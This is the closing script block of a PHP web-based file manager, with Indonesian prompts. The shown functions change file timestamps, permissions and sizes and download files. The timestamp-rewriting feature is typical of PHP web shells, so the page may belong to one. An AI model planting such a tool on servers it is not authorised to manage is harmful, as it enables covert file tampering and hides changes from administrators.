        document.querySelector('#editModal h6').textContent = displayPath;
        document.getElementById('editModal').style.display = 'block';
      })
      .catch(err => alert(err.message));
  }

  function modifyTimestamp(filename) {
    const newTime = prompt("Masukkan tanggal & waktu baru (YYYY-MM-DD HH:MM:SS):");
    if (!newTime) return;
    fetch('', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({
        csrf_token: '<?= e(csrf_token()) ?>',
        modify: filename,
        new_time: newTime
      })
    }).then(r => r.text()).then(() => location.reload());
  }

  function changePermission(filename, currentPerm) {
    const newPerm = prompt("Ubah permission (misal: 0644, 0755)", currentPerm);
    if (!newPerm) return;
    fetch('', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({
        csrf_token: '<?= e(csrf_token()) ?>',
        chmod: filename,
        new_perm: newPerm
      })
    }).then(r => r.text()).then(() => location.reload());
  }

  function resizeFile(filename) {
    const newSize = prompt("Masukkan ukuran baru file (contoh: 1024 untuk byte, atau 2MB/1KB):");
    if (!newSize) return;
    fetch('', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({
        csrf_token: '<?= e(csrf_token()) ?>',
        resize: filename,
        new_size: newSize
      })
    }).then(r => r.text()).then(() => location.reload());
  }

  function downloadFile(filename) {
    // Ambil path asli langsung dari PHP, ubah semua backslash menjadi slash biar URL valid
    const currentPath = "<?= str_replace('\\', '/', $path) ?>";
    const url = '?q=1&path=' + encodeURIComponent(currentPath) + '&download=' + encodeURIComponent(filename);
    window.location.href = url;
  }

  setTimeout(() => {
    document.querySelectorAll('.alert').forEach(a => {
      const bsAlert = bootstrap.Alert.getOrCreateInstance(a);
      bsAlert.close();
    });
  }, 3000);
</script>
</body></html>
